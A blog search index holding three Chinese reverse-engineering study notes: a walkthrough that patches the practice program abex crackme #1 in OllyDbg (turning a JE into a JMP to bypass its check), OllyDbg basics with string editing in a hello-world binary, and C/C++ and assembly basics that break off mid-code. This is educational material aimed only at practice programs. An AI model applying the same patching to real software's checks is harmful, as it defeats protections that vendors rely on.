<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>逆向学习笔记三</title>
    <link href="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <url>/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="分析cbex-crackme-1"><a href="#分析cbex-crackme-1" class="headerlink" title="分析cbex crackme#1"></a>分析cbex crackme#1</h2><p>crackme就是“破解我”的意思，它们都是一些公开用作破解练习的小程序<br>下载地址：<a href="https://github.com/idea-oss/example-/tree/main/01/06/bin">https://github.com/idea-oss/example-/tree/main/01/06/bin</a></p><ul><li><p><strong>运行程序</strong><br><img src="https://img-blog.csdnimg.cn/0b87009e8473493e8bb22aa6448d91cf.png" alt="在这里插入图片描述"><br>点击确定后，然后几出错了<br><img src="https://img-blog.csdnimg.cn/a0ad7a3e80b447989b64eae492877b43.png" alt="在这里插入图片描述"></p></li><li><p><strong>用od打开调试</strong><br>用之前的方法找到入口函数<br><img src="https://img-blog.csdnimg.cn/1b328fa89e8944fe9ce521636479dfeb.png" alt="在这里插入图片描述"></p></li><li><p><strong>代码分析</strong></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#这里是给messagebox()函数传参，并调用</span><br>PUSH 0                                   ; /Style = MB_OK|MB_APPLMODAL<br>PUSH abexcm1-.00402000                   ; |Title = <span class="hljs-string">&quot;abex&#x27; 1st crackme&quot;</span><br>PUSH abexcm1-.00402012                   ; |Text = <span class="hljs-string">&quot;Make me think your HD is a CD-Rom.&quot;</span><br>PUSH 0                                   ; |hOwner = NULL<br>CALL &lt;JMP.&amp;USER32.MessageBoxA&gt;           ; \MessageBoxA<br><span class="hljs-comment">#给getdrivetype()函数传参并调用，getdrivetype(） api，获取c驱动的类型(大部分返回的是HDD类型)</span><br>PUSH abexcm1-.00402094                   ; /RootPathName = <span class="hljs-string">&quot;c:\&quot;</span><br><span class="hljs-string">CALL &lt;JMP.&amp;KERNEL32.GetDriveTypeA&gt;       ; \GetDriveTypeA 返回值(eax)是三(drive_fixed)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">INC ESI ;inc esi为自加一操作，esi的值为0</span><br><span class="hljs-string">DEC EAX;dec为自减一操作，所以eax变成了2</span><br><span class="hljs-string">JMP SHORT abexcm1-.00401021;无用操作，就是跳到下一行代码处</span><br><span class="hljs-string">INC ESI</span><br><span class="hljs-string">INC ESI</span><br><span class="hljs-string">DEC EAX</span><br><span class="hljs-string">CMP EAX,ESI;比较eax,esi</span><br><span class="hljs-string">JE SHORT abexcm1-.0040103D;若上面比较的值相等就跳转40103D，否则就向下执行命令</span><br><span class="hljs-string">PUSH 0                                   ; /Style = MB_OK|MB_APPLMODAL</span><br><span class="hljs-string">PUSH abexcm1-.00402035                   ; |Title = &quot;</span>Error<span class="hljs-string">&quot;</span><br><span class="hljs-string">PUSH abexcm1-.0040203B                   ; |Text = &quot;</span>Nah... This is not a CD-ROM Drive!<span class="hljs-string">&quot;</span><br><span class="hljs-string">PUSH 0                                   ; |hOwner = NULL</span><br><span class="hljs-string">CALL &lt;JMP.&amp;USER32.MessageBoxA&gt;           ; \MessageBoxA</span><br><span class="hljs-string">JMP SHORT abexcm1-.00401050</span><br><span class="hljs-string">PUSH 0                                   ; |/Style = MB_OK|MB_APPLMODAL</span><br><span class="hljs-string">PUSH abexcm1-.0040205E                   ; ||Title = &quot;</span>YEAH!<span class="hljs-string">&quot;</span><br><span class="hljs-string">PUSH abexcm1-.00402064                   ; ||Text = &quot;</span>Ok, I really think that your HD is a CD-ROM! :p<span class="hljs-string">&quot;</span><br><span class="hljs-string">PUSH 0                                   ; ||hOwner = NULL</span><br><span class="hljs-string">CALL &lt;JMP.&amp;USER32.MessageBoxA&gt;           ; |\MessageBoxA</span><br><span class="hljs-string">CALL &lt;JMP.&amp;KERNEL32.ExitProcess&gt;         ; \ExitProcess</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>push</td><td>入栈操作</td></tr><tr><td>call</td><td>调用指定位置的函数</td></tr><tr><td>inc</td><td>值加1</td></tr><tr><td>dec</td><td>值减1</td></tr><tr><td>jmp</td><td>跳转到指定地址</td></tr><tr><td>cmp</td><td>比较给定的两个操作数与sub命令类似，但是操作数的值不会改变，仅改变eflags寄存器(若两个操作数的值一致,sub结果为0，zf被置为1)</td></tr><tr><td>je</td><td>条件跳转指令(jump if equal) 若zf为1，则跳转</td></tr></tbody></table><ul><li><strong>破解</strong><br>在如下位置，按空格<br><img src="https://img-blog.csdnimg.cn/ef5ec8c6ae72480582c097f4650eb8c6.png" alt="在这里插入图片描述"><br>将JE条件跳转指令改成JMP无条件跳转即可<br><img src="https://img-blog.csdnimg.cn/1e22992744c94a23960a3dcefda20327.png" alt="在这里插入图片描述"><br>copy to executable<br><img src="https://img-blog.csdnimg.cn/a9785b685b224c73971b2d4f539f3878.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ec2e81b7fca94619a681efe3bf491eab.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ffb07818c56647e3a7cf620a30021e94.png" alt="在这里插入图片描述"><br>然后运行修改后的程序</li></ul><p><img src="https://img-blog.csdnimg.cn/6fff1f8479884ce2a7ca2bb6197f5f26.png"><br>破解成功</p><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧在程序中用于声明局部变量、调用函数。栈帧就是利用EBP(栈帧指针，请注意不是ESP)寄存器访问栈内部局部变量、参数函数返回地址等手段ESP承担着栈顶指针的作用，而EBP寄存器则负责行使栈帧指针的职能。程序运行中，ESP寄存器的值随时变化，访问栈中函数的局部变量、参数时，若以ESP值为基准编写程序会十分困难，并且也很难使CPU引用到准确的地址。所以，调用某函数时，先要把用作基准点(函数起始地址)的ESP值保存到EBP并维持在函数内部。这样，无论ESP的值如何变化，以EBP的值为基准能够安全访问到相关函数的局部变量、参数、返回地址，这就是EBP寄存器作为栈帧指针的作用</p><p>栈帧对应的汇编代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">push ebp;函数开始，使用ebp前先把已有的值保存到栈中<br>mov ebp,esp;保存当前esp到ebp中<br>......<br>mov esp,ebp;将函数的起始地址返回到esp中<br>pop ebp;函数返回前弹出保存在栈中的ebp值<br>retn;函数终止<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向学习笔记二</title>
    <link href="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <url>/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="逆向基础"><a href="#逆向基础" class="headerlink" title="逆向基础"></a>逆向基础</h2><h2 id="一：OD操作基础"><a href="#一：OD操作基础" class="headerlink" title="一：OD操作基础"></a>一：OD操作基础</h2><p><img src="https://img-blog.csdnimg.cn/43bab24e63e34a5392ea1115ceea8a05.png" alt="在这里插入图片描述"></p><ul><li><p><strong>goto语句</strong><br>跳转到指定位置去，执行Go to(Ctrl + G) 命<br><img src="https://img-blog.csdnimg.cn/b9c15d4080a44158b74f2b7dff16253c.png" alt="在这里插入图片描述"></p></li><li><p><strong>设置断点</strong><br>设置BP(Break Point,断点)(快捷键F2)<br>设置断点后，调试运行到断点处将会暂停(若未在代码中设置断点则继续调试)。<br>在OD菜单栏中依次选中View-Breakpoints选项(快捷键 ALT+B),打开Breakpoints对话框，列出代码中设置的断点</p></li><li><p><strong>注释</strong><br>按键盘上的”;”可以在指定地址处添加注释</p></li><li><p><strong>标签</strong><br>我们可以通过标签提供的功能在指定地址添加特定名称。移动光标到指定地址处，按”:”键输入标签</p></li></ul><h2 id="二：快速查找指定代码方法"><a href="#二：快速查找指定代码方法" class="headerlink" title="二：快速查找指定代码方法"></a>二：快速查找指定代码方法</h2><p>调试代码时，main()函数并不直接位于可执行文件的EP位置上，出现在此的时开发工具(Visual c++)生成的启动函数。我们需要查看的main()函数距离EP代码很远，快速找到main()函数有四种</p><ul><li><p><strong>代码执行法</strong><br>适用于量不大，且程序功能明确的情况</p></li><li><p><strong>字符串检索法</strong><br>鼠标右键菜单–search for –all referenced text strings<br>在OD的Dump窗口中使用Go to(Ctrl+G)命令，可以进一步查看位于内存某处的字符串。首先使用鼠标点击dump窗口，然后按Ctrl+G快捷键，打开Enter expression to follow in Dump窗口。<br><img src="https://img-blog.csdnimg.cn/e6baad086b954f02bde4a43bc1100a04.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fd670834a13942bfbd44265b2d04980b.png" alt="在这里插入图片描述"></p></li><li><p><strong>API检索法：在调用代码中设置断点</strong><br>鼠标右键菜单–Search for –all intermodular calls(所有模块间的调用)<br><img src="https://img-blog.csdnimg.cn/ce235c9ad4784e749143ea3d09b8a1de.png" alt="在这里插入图片描述"></p></li><li><p><strong>API检索法：再API代码中设置断点</strong><br>鼠标右键菜单–Search for—Name in all calls（“所有模块中的名称”并敲下MessageBox,光标会直接定位到messagebox那去）<br>OD并不能为所有可执行文件都列出API函数列表。使用压缩器&#x2F;保护器工具对可执行文件进行压缩保护之后，文件结构就会改变，此时OD就无法列出API调用列表了(甚至连调试都会变得非常麻烦)<br><img src="https://img-blog.csdnimg.cn/cebbb1b98db24f10aeabbca9e72ef2e5.png" alt="在这里插入图片描述"><br>在OD中选择View-Memory菜单(快捷键Alt+M),打开内存映射窗口。</p></li></ul><h2 id="三：修改字符串"><a href="#三：修改字符串" class="headerlink" title="三：修改字符串"></a>三：修改字符串</h2><ul><li><p><strong>直接修改字符串缓冲区</strong><br>在dump窗口按ctrl+G快捷键执行Go to命令，在弹出的窗口中输入字符串的地址进入字符串缓冲区。然后在选中地址处的字符串，按ctrl+e快捷键打开编辑窗口修改<br><img src="https://img-blog.csdnimg.cn/75fc34490cc84927845968cd5342c3e7.png" alt="在这里插入图片描述"><br>unicode字符串必须以null结束，它占据2个字节(添加null时不能直接在unicode文本框中进行，需要在hex项目中添加)<br><img src="https://img-blog.csdnimg.cn/4389d051d33c4b54ba975100059f6a3d.png" alt="在这里插入图片描述"><br>上面的更改只是零时的，永久保存就要更改程序后另保存为一个可执行文件。<br>在dump窗口中，选中更改后的字符串—单击鼠标右键—在弹出的菜单中选中copy to executable file菜单<br>然后 在hex窗口中鼠标右键–选择save file菜单</p></li><li><p><strong>在其他内存区域生成新字符串并传递给消息函数</strong><br>按ctrl+f2重新调试，开始的时候在main函数的地址处下了断点在按f9就会自动跳转到main函数处了</p></li></ul><p>向MessageBoxW()函数传递字符串参数时，传递的是字符串所在区域的首地址。如果改变了字符串地址，消息框就会显示改变后的字符串。在内存的某个区域新建一个长字符串，并把新字符串的首地址传递给MessageBoxW()函数，可以人为传递的是完全不同的字符串地址。</p><ul><li><strong>简单分析helloword</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR * argv[])<br>&#123;<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>,<span class="hljs-string">&quot;Hello World!&quot;</span>,<span class="hljs-string">&quot;张轩瑞&quot;</span>,MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用vs生成release exe<br>用od打开<br><img src="https://img-blog.csdnimg.cn/cf9fa522395a4e23ae26018b72b06d26.png" alt="在这里插入图片描述"><br>打开后直接敲messageboxw(因为输出字符会调用这个api)<br><img src="https://img-blog.csdnimg.cn/6d7aaa6eb8254f21a9a982436bd93a72.png" alt="在这里插入图片描述"><br>然后我们直接点击即可,来到了这里<br><img src="https://img-blog.csdnimg.cn/2a6457e6379d48bab93f28bc7cbbedc1.png" alt="在这里插入图片描述"><br>在函数起始地址处下上断点(f2)<br><img src="https://img-blog.csdnimg.cn/66c5b019555a4780a64f5c56e45c3e32.png" alt="在这里插入图片描述"><br>然后按f9继续执行<br><img src="https://img-blog.csdnimg.cn/67fceadeeb044fa7958a9e9041af7bd6.png" alt="在这里插入图片描述"><br>程序执行到messageboxw代码的断点处就停下来了，可以看见栈中的值<br><img src="https://img-blog.csdnimg.cn/927c326ff9d94d50ae3eab747e16b63a.png" alt="在这里插入图片描述"><br>esp值的18ff30处对应一个返回地址401014，helloworld.exe的main()函数调用完messageboxw函数后，程序执行流将返回到该地址处。按ctrl+f9快捷键使程序运行到messageboxw函数的RETN命令处，然后按F7键也可以返回到401014地址处。地址401014的上方就是地址40100E,它正是调用messageboxw函数的地方<br><img src="https://img-blog.csdnimg.cn/27a662084ad044d4a29f8507b3b92809.png" alt="在这里插入图片描述"><br><strong>修改字符串缓冲：</strong><br>在dump窗口输入ctrl+g快捷键执行go to命令<br><img src="https://img-blog.csdnimg.cn/9ac0a2d35e5e4e51aada440faccb1f4c.png" alt="在这里插入图片描述"><br>然后点击确定，然后选中4092A0地址处的字符串<br><img src="https://img-blog.csdnimg.cn/4f455a8ba8c34dd9b9738832b7a8d8a0.png" alt="在这里插入图片描述"><br>快捷键ctrl+e打开编辑窗口<br><img src="https://img-blog.csdnimg.cn/67ed2dc904114fe99255815e1602e8b0.png" alt="在这里插入图片描述"><br>请注意：unicode字符串必须以null结束，它占据2个字节(添加null时不能直接在unicode文本框中进行，而要在hex项目中添加)<br>然后鼠标右键–&gt;复制到可执行文件—&gt;保存为文件 保存为exe即可<br><img src="https://img-blog.csdnimg.cn/8a811878bbc147758ed02b8afdf90143.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6858a17a67004ce795da041e88fcabb0.png" alt="在这里插入图片描述"><br>运行修改生成后的exe，可见修改成功<br><img src="https://img-blog.csdnimg.cn/87481a2fc51b4e9bacf8ab8642ae2fa6.png" alt="在这里插入图片描述"><br><strong>其他内区域新建字符串并传递给消息函数</strong><br><img src="https://img-blog.csdnimg.cn/bdb1663c38604036a1cd3f3c9f54f07a.png" alt="在这里插入图片描述"><br>401007地址处有一条push 004029A0命令（前面那字符串不用管），它是把该地址处的值也就是hello world传递给messageboxw()函数   (字符串所在区域首地址)</p><p>我们在方法一中修改的字符串地址为4092A0,在dump窗口查看该部分<br>，我们找到内存区域有null填充的部分<br><img src="https://img-blog.csdnimg.cn/304fec660ee14330812176ad68ed9f37.png" alt="在这里插入图片描述"><br>在这里远一个地址填入我们想要修改的字符串<br><img src="https://img-blog.csdnimg.cn/aa638ff4bc81447cb421ada9d5fc9651.png" alt="在这里插入图片描述"><br>修改地址<br><img src="https://img-blog.csdnimg.cn/d9d3c4f3ea454a3ca5f29cbff817831b.png" alt="在这里插入图片描述"><br>按f9运行程序<br><img src="https://img-blog.csdnimg.cn/d1e6cf209cc84eb09e07b13ea1c708d4.png" alt="在这里插入图片描述"><br>修改成功</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向学习笔记 一</title>
    <link href="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <url>/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="C语言概述"><a href="#C语言概述" class="headerlink" title="C语言概述"></a>C语言概述</h2><ul><li><strong>基础语法</strong><br>指针</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> *b)</span> &#123;<br><span class="hljs-type">int</span> temp = *a + *b;<br>*a = temp;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">int</span> x = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> y = <span class="hljs-number">20</span>;<br>add(&amp;x,&amp;y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, x);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//结果30</span><br></code></pre></td></tr></table></figure><p>fgets&#x2F;fputs</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> sz[<span class="hljs-number">50</span>];<br>fgets(sz,<span class="hljs-number">50</span>,<span class="hljs-built_in">stdin</span>);<br><span class="hljs-built_in">fputs</span>(sz,<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>C预处理器</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">//定义预处理器</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUM(a, b, c) a+b+c</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> c = NUM(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,c);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="c-基础"><a href="#c-基础" class="headerlink" title="c++基础"></a>c++基础</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//赋值新特性也可以用=</span><br><span class="hljs-type">int</span> num&#123; <span class="hljs-number">5</span> &#125;;<br>std::cout &lt;&lt; num &lt;&lt; std::endl;<br><span class="hljs-comment">//声明为常量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> num1=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-comment">//起别名</span><br><span class="hljs-comment">//typedef unsigned int uint32;</span><br><span class="hljs-keyword">using</span> uint32 = <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>uint32 num&#123; <span class="hljs-number">9</span> &#125;;<br>num = num &lt;&lt; <span class="hljs-number">3</span>;<br>std::cout &lt;&lt; num &lt;&lt; std::endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><strong>决策</strong><br>if-else  switch</p></li><li><p><strong>循环</strong><br>for while  do-while</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>std::vector&lt;<span class="hljs-type">int</span>&gt;nNum;<br><span class="hljs-comment">//往里添加元素</span><br>nNum.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">10</span>);<br><span class="hljs-comment">//删除元素  pop_back()</span><br><span class="hljs-comment">//清空元素</span><br>nNum.<span class="hljs-built_in">clear</span>();<br><span class="hljs-comment">//初始化 std::vector&lt;int&gt;nNum(10,20);</span><br><span class="hljs-comment">//初始化 std::vector&lt;int&gt;nNum&#123;1,2,3,4,5,6,7&#125;;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>命名空间</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-comment">//命名空间</span><br><span class="hljs-keyword">namespace</span> MyName &#123;<br><span class="hljs-type">const</span> <span class="hljs-type">float</span> pi&#123; <span class="hljs-number">3.14</span> &#125;;<br>&#125;<br><br><span class="hljs-comment">//全局声明</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> MyName;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; pi &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>面向对象</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">volume</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> Length * width * heigth;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> Length&#123; <span class="hljs-number">5</span> &#125;;<br><span class="hljs-type">int</span> width&#123; <span class="hljs-number">6</span> &#125;;<br><span class="hljs-type">int</span> heigth&#123; <span class="hljs-number">8</span> &#125;;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//创建类对象</span><br>MyClass my;<br>std::cout &lt;&lt; my.<span class="hljs-built_in">volume</span>() &lt;&lt; std::endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><ul><li><strong>用vs2017创建汇编程序项目</strong><br><img src="https://img-blog.csdnimg.cn/d0c55e1b73ad43f79cafb39f01b34fee.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e84a4cadcf264fef8b775db57f1e23ed.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d4c7c44efc4146f0ba7631042dff9823.png" alt="在这里插入图片描述"><br>点击确定<br><img src="https://img-blog.csdnimg.cn/d91420ae5e574b56a4fcd801af2d597a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/638499961cc24e5387955ecc3f723b53.png" alt="在这里插入图片描述"><br>然后点击应用 确定</li></ul><p>下载msam32 <a href="http://www.masm32.com/">http://www.masm32.com/</a><br><img src="https://img-blog.csdnimg.cn/ed9537d257284ebeaab84cf7e94e6679.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1fdebd8c0a4c4f408ce7c24b1edc80dd.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/3f8665ba9aba4d29bfdbad4a5bce2177.png" alt="在这里插入图片描述"><br>添加新建项  改后缀为.asm，就可以编写汇编语言了</p><p>hello word汇编程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 